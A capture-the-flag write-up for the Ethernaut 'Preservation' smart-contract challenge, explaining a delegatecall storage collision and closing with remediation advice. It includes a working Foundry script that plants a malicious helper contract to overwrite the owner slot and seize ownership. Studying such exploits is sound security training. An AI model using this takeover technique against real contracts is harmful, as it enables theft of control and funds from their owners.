# Preservation — Security Writeup

| | |
|---|---|
| **Challenge** | [Ethernaut 17 — Preservation](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-preservation) |
| **Platform** | Smart Contracts Hacking (SCH) / OpenZeppelin Ethernaut |
| **Target** | `src/Preservation.sol` |
| **Solidity** | `^0.8.0` |
| **Severity** | Critical (ownership takeover) |
| **Status** | Exploited — local PoC passing |

---

## Executive summary

`setFirstTime` / `setSecondTime` `delegatecall` into library contracts whose storage layout does not match `Preservation`. The library's `storedTime` (slot 0) collides with `timeZone1Library`, so an attacker can point the library to a malicious contract and then overwrite `owner` (slot 2).

---

## Challenge objectives

| # | Condition | How verified |
|---|-----------|--------------|
| 1 | Player is owner | `preservationInstance.owner() == PLAYER_ADDRESS` |

---

## Finding

### [C-01] Storage collision via unchecked `delegatecall`

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **Bug class** | Delegatecall / storage collision |
| **Location** | `setFirstTime` + `LibraryContract.setTime` |

#### Proof of concept

```bash
cd web3-ctf-challenges/17-ethernaut-preservation
forge test --match-test testExploit -vv
```

---

## Exploit implementation

### SCH (`Exploit.s.sol`)

```solidity
contract HelperContract {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 time) external {
        owner = address(uint160(time));
    }
}

function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);

    HelperContract evil = new HelperContract();
    preservationInstance.setFirstTime(uint256(uint160(address(evil))));
    preservationInstance.setFirstTime(uint256(uint160(PLAYER_ADDRESS)));

    vm.stopBroadcast();
}
```

Instance name: `preservationInstance`.

---

## Remediation

Align storage layouts, use Solidity `library` (no storage), or namespaced/diamond storage. Never `delegatecall` untrusted or layout-mismatched code.

---

## Key lessons

1. **`delegatecall` uses caller's storage**
2. **Library layout must match** the calling contract
3. **Slot 0 collision** can replace the library pointer itself

---

## References

- [SCH Preservation](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-preservation)
- Local: `Exploit.s.sol`, `test/PreservationExploit.t.sol`
